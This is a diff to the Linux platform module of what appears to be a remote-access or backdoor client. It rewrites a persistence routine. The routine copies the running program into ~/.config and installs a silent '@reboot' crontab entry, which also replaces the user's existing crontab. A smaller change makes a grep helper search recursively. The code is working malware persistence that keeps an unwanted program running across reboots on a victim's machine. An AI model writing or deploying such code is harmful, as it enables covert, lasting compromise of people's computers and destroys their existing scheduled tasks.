@@ -42,16 +42,28 @@ class LinuxPlatform(AbstractPlatform):
 
     def install_persistence(self, reg_name, copy_name):
         try:
-            client_path = os.path.expanduser(f'~/.config/{copy_name}')
-            if not os.path.exists(client_path):
+            dest_dir = os.path.expanduser(f'~/.config')
+            os.makedirs(dest_dir, exist_ok=True)
+            client_path = os.path.join(dest_dir, copy_name)
+
+            if getattr(sys, 'frozen', False):
                 shutil.copyfile(sys.executable, client_path)
-            cron_line = f'@reboot {sys.executable} ~/.config/{copy_name}\n'
-            cron_path = os.path.expanduser('~/.config/crontab_entry')
+                os.chmod(client_path, 0o755)
+                cron_cmd = f'{client_path}'
+            else:
+                script_path = os.path.abspath(sys.argv[0])
+                if os.path.isdir(script_path):
+                    script_path = os.path.join(script_path, '__main__.py')
+                shutil.copyfile(script_path, client_path)
+                cron_cmd = f'{sys.executable} {client_path}'
+
+            cron_line = f'@reboot {cron_cmd} >/dev/null 2>&1\n'
+            cron_path = os.path.join(dest_dir, 'crontab_entry')
             with open(cron_path, 'w') as f:
                 f.write(cron_line)
             subprocess.call(f'crontab {cron_path}', shell=True)
             os.remove(cron_path)
-            return f'[+] Created Persistence via crontab'
+            return '[+] Created persistence via crontab'
         except Exception as e:
             return f'[-] Persistence error: {e}'
 
@@ -80,7 +92,7 @@ class LinuxPlatform(AbstractPlatform):
         return None
 
     def grep_cmd(self, pattern):
-        return f'grep "{pattern}"'
+        return f'grep -r "{pattern}" .'
 
     def clear_screen_cmd(self):
         return 'clear'
